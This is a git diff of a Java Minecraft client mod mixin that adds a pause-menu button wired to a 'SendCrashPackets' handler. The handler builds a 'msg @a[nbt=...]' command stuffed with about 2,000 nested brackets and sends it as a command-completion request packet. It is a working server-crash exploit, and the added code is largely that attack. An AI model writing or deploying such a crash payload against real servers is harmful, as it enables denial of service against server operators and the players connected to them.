@@ -1,5 +1,3 @@
-
-
 package com.atg.completion.mixin;
 
 import com.atg.completion.Screens.SettingsScreen;
@@ -8,6 +6,7 @@ import net.minecraft.client.gui.screen.GameMenuScreen;
 import net.minecraft.client.gui.screen.Screen;
 import net.minecraft.client.gui.widget.ButtonWidget;
 import net.minecraft.client.gui.widget.TexturedButtonWidget;
+import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
 import net.minecraft.text.Text;
 import net.minecraft.client.MinecraftClient;
 import org.spongepowered.asm.mixin.Final;
@@ -18,8 +17,11 @@ import org.spongepowered.asm.mixin.injection.At;
 import org.spongepowered.asm.mixin.injection.Inject;
 import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;
 
+import java.util.stream.Collectors;
+import java.util.stream.IntStream;
+
 @Mixin(GameMenuScreen.class)
-public abstract class GameMenuScreenMixin extends Screen {
+public abstract class gameMenuScreenMixin extends Screen {
 
     @Shadow
     @Final
@@ -27,8 +29,8 @@ public abstract class GameMenuScreenMixin extends Screen {
     @Unique
     private final MinecraftClient mc = MinecraftClient.getInstance();
 
-    public GameMenuScreenMixin(RunArgs.Game screenHandler, Text text) {
-    super(text);
+    public gameMenuScreenMixin(RunArgs.Game screenHandler, Text text) {
+        super(text);
     }
 
     @Inject(method = "init", at = @At("TAIL"))
@@ -46,13 +48,34 @@ public abstract class GameMenuScreenMixin extends Screen {
         );
     }
 
+
+    private int length = 2032;
+
+    String overflow = generateJsonObject(length);
+    String message = "msg @a[nbt={PAYLOAD}]";
+    String partialCommand = message.replace("{PAYLOAD}", overflow);
+
     @Unique
     private void SendCrashPackets(ButtonWidget button) {
-        System.out.println("if this prints it works 1");
+        MinecraftClient.getInstance().player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
+        System.out.println("SendCrashPackets Works");
     }
+
     @Unique
     private void OpenSettingsMenu(ButtonWidget button) {
         mc.setScreen(new SettingsScreen(this));
-        System.out.println("if this prints it works 2");
+    }
+
+    private String generateJsonObject(int levels) {
+        String in = IntStream.range(0, levels)
+            .mapToObj(i -> "[")
+            .collect(Collectors.joining());
+            System.out.println("generateJsonObject works");
+        return "{a:" + in + "}";
+
+    }
+
+    public void main() {
     }
 }
+
